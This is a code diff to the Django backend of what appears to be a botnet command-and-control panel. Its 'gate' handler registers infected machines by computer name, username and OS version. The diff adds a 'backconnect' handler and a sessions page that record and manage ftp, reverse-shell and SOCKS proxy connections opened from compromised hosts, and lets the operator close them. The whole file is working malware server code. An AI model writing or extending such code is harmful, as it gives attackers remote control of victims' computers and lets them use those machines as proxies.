@@ -5,9 +5,10 @@ from django.contrib.auth.models import User
 from django.contrib.auth import login
 from django.views.decorators.csrf import csrf_exempt
 from .bot_pb2 import BotMsg, BackConnectMsg, PanelMsg
-from .models import Bot
+from .models import Bot, Session
 import datetime
 import struct
+
 
 # from django.core.paginator import Paginator
 
@@ -120,6 +121,10 @@ class AdminPanel:
 
         return render(request, 'main/table.html', {'bots': bots})
 
+    def get_sessions_page(self, request):
+        sessions = Session.objects.all()
+        return render(request, 'main/session.html', {'sessions': sessions})
+
     @staticmethod
     def task(request) -> render:
         return render(request, 'main/task.html')
@@ -149,16 +154,6 @@ class Handlers:
         print((_1 - _2).seconds // 60)
         return HttpResponse('')
 
-    def back_connect(self, request):
-        try:
-            msg = BackConnectMsg()
-            msg.ParseFromString(request.body)
-            print(msg.uid.decode('utf-16-le'))
-            return 200
-        except Exception as e:
-            print(e)
-            return 404
-
     @staticmethod
     def login_handler(request) -> HttpResponse or JsonResponse:
         print(request.user)
@@ -169,6 +164,55 @@ class Handlers:
             login(request, usr)
             return JsonResponse({'verdict': '200'})
         return HttpResponse('')
+
+    @csrf_exempt
+    def backconnect(self, request):
+        try:
+
+            msg_type = struct.unpack('=I', request.body[:4])[0]
+            if msg_type == 1:
+
+                types = {
+                    1: 'ftp', 2: 'reverse shell', 3: 'socks'
+                }
+
+                ip = self.sub.get_bot_ip(request)
+
+                session = BackConnectMsg.NewConnection()
+                session.ParseFromString(request.body[4:])
+
+                uid = session.uid.decode('utf-16-le')
+                _type = types[session.type]
+                ip_port = str(ip) + ':' + str(session.port)
+
+                new_session = Session(uid=uid, ip_port=ip_port, connection_type=_type)
+                new_session.save()
+                return HttpResponse('200')
+
+            elif msg_type == 2:
+                conn = BackConnectMsg.ConnectionClosed()
+                conn.ParseFromString(request.body[4:])
+
+                session = Session.objects.get(uid=conn.uid.decode('utf-16-le'))
+                session.delete()
+
+                return HttpResponse('200')
+
+        except Exception as e:
+            print(e)
+            return HttpResponse('400')
+
+    @csrf_exempt
+    def stop_conn(self, request):
+        try:
+            _id = request.POST['_id']
+            session = Session.objects.get(uid=_id)
+            session.delete()
+            return HttpResponse('200')
+
+        except Exception as e:
+            print(e)
+            return HttpResponse('400')
 
     @csrf_exempt
     def gate(self, request) -> HttpResponse:
@@ -194,7 +238,8 @@ class Handlers:
                     _bot = Bot.objects.get(uid=uid)
                 except Exception as e:
                     print(e)
-                    _bot = Bot(ip=ip, uid=uid, computername=computername, username=username, is_x64=is_x64, is_server=is_server)
+                    _bot = Bot(ip=ip, uid=uid, computername=computername, username=username, is_x64=is_x64,
+                               is_server=is_server)
 
                 if os_major == 10 and os_minor == 0:
                     _bot.is_win10 = True
@@ -240,4 +285,4 @@ class Handlers:
         bot.save()
         return HttpResponse('200')
 
-# ОБРАБОТЧИКИ -------------------------------------------- /\
+# ОБРАБОТЧИКИ -------------------------------------------- /
